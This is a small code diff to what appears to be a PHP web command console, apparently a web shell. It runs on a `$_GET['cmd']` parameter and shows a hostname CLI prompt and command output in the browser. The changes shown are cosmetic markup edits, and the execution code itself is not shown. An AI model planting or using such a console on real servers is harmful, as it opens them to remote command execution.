@@ -184,7 +184,6 @@ if (!empty($_GET['cmd'])) {
 
                     <div class="search-item c_bg-2" id="outt" >
                         <?= $hostn . '*CLI>'; ?>
-                        <div class="clear"></div>
                     </div>
                     <div class="search-item c_bg-1" id="input-conteiner">
                         <input tabindex="1" onkeyup="keyE(event);" class="span" id="cmd" type="text" />
@@ -211,7 +210,7 @@ if (!empty($_GET['cmd'])) {
                     {
                         var _6 = document.getElementById("outt");
                         var _7 = rS.split("\n\n");
-                        var _8 = "<b>" + document.getElementById("cmd").value + "</b>";
+                        var _8 = document.getElementById("cmd").value;
                         _6.appendChild(document.createTextNode(_8));
                         _6.appendChild(document.createElement("br"));
                         for (var _9 in _7)
